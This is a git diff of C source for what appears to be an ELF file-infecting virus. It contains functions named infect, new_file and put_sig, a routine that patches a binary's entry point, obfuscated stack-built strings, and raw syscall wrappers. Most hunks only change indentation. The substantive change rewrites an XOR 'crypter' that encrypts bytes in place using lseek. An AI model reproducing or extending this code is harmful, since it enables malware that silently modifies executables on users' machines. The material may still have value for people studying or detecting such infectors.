@@ -411,7 +411,7 @@ int main_encrypt()
 	//printf("content %s\n",path_env);
 	size_t path_length = ft_strlen(path_env);
 	size_t i = 0;
-ft_putstr(path_maj);
+	ft_putstr(path_maj);
 	int length_path =0;
 	do
 	{
@@ -443,9 +443,10 @@ ft_putstr(path_maj);
 }
 __syscall1(int, unlink, const char *, pathname);
 __syscall2(int, fstat, int, fildes, struct stat * , buf);
+__syscall3(off_t, lseek, int, fildes, off_t, offset, int, whence);
 
 
- int get_env_var(char *name, char *content, int content_size)
+int get_env_var(char *name, char *content, int content_size)
 {
 	char buf[4];
 	int fd;
@@ -453,7 +454,7 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 	int j,k = 0;
 	int nb_start = 1;
 	int name_lenght = ft_strlen(name);
-char path_proc[] = {'/','p','r','o','c','/','s','e','l','f','/','e','n','v','i','r','o','n',0};
+	char path_proc[] = {'/','p','r','o','c','/','s','e','l','f','/','e','n','v','i','r','o','n',0};
 	if ((fd = open(path_proc,0x0000,0))<0)
 		return (0);
 	do
@@ -493,7 +494,7 @@ char path_proc[] = {'/','p','r','o','c','/','s','e','l','f','/','e','n','v','i',
 	close(fd);
 	return (content[0] != '\0');
 }
- int open_directory(char *path)
+int open_directory(char *path)
 {
 	int dd,nread;
 	char buf[128];
@@ -579,7 +580,7 @@ char path_proc[] = {'/','p','r','o','c','/','s','e','l','f','/','e','n','v','i',
 	close(dd);
 	return 0;
 }
- int do_the_job(char buff[],size_t size, char *path)
+int do_the_job(char buff[],size_t size, char *path)
 {
  	char debut[]={'d','e','b','u','t',' ','d','o','_','t','h','e','_','j','o','b','\n','0'};
 	ft_putstr(debut);
@@ -702,7 +703,7 @@ int infect(char path[],size_t path_length)
 	while(i < path_length);
 	return 0;
 }
- char    *only_name(char *line)
+char    *only_name(char *line)
 {
 	int        size;
 	size = ft_strlen(line);
@@ -714,7 +715,7 @@ int infect(char path[],size_t path_length)
 	}
 	return (line);
 }
- void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry)
+void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry)
 {
 	int fd;
 	char tmp[125];
@@ -757,7 +758,7 @@ int infect(char path[],size_t path_length)
 
 	unsigned long address_of_start = get_eip() - ((char *)&yeah - (char *)&real_start);
 
-size_t size_wrote = 0;
+	size_t size_wrote = 0;
 	size_wrote =	put_sig(fd);
 
 	char fwe[]={'s','i','z','e',' ' ,'w','r','o','t','e',' ' ,':',' ' ,0};ft_putstr(fwe);ft_putnbr(size_wrote);ft_putstr("\n");
@@ -803,7 +804,7 @@ size_t size_wrote = 0;
 
 }
 
- int             ft_strncmp(const char *s1, const char *s2, size_t n)
+int             ft_strncmp(const char *s1, const char *s2, size_t n)
 {
 	size_t  index;
 
@@ -888,15 +889,30 @@ void crypter(char *read, size_t size, char key, int fd)
 {
 	char tab[]= {0,0};
 
-	if(size && is_infected(read))
+	if(size)
 	{
-		write(fd, (tab[size % 2] = (read[size] ^ key)), 1);
-		size--;
-		while (size)
+		lseek(fd, (off_t)size, SEEK_CUR);
+		// ft_putnbr(lseek(fd, (off_t)size, SEEK_CUR));
+		// ft_putstr("\n");
+		// ft_putnbr(size);
+		// ft_putstr("\n");
+		tab[(size - 1) % 2] = read[size + 1];
+		while ((int)size > 0)
 		{
-			write(fd, (tab[size % 2] = (read[size] ^ tab[(size - 1) % 2])), 1);
+		// 	ft_putnbr(size);
+		// ft_putstr("\\");
+			tab[size % 2] = (read[size] ^ tab[(size - 1) % 2]);
+			write(fd, &(tab[size % 2]), 1);
+			lseek(fd, (off_t)-2, SEEK_CUR);
 			size--;
 		}
+		tab[size % 2] = (read[size] ^ key);
+		write(fd, &(tab[size % 2]), 1);
+		// ft_putstr("bite\n");
+		lseek(fd, (off_t)0, SEEK_END);
+		ft_putnbr(lseek(fd, (off_t)0, SEEK_END));
+		// ft_putstr("\n");
+		size--;
 	}
 }
 
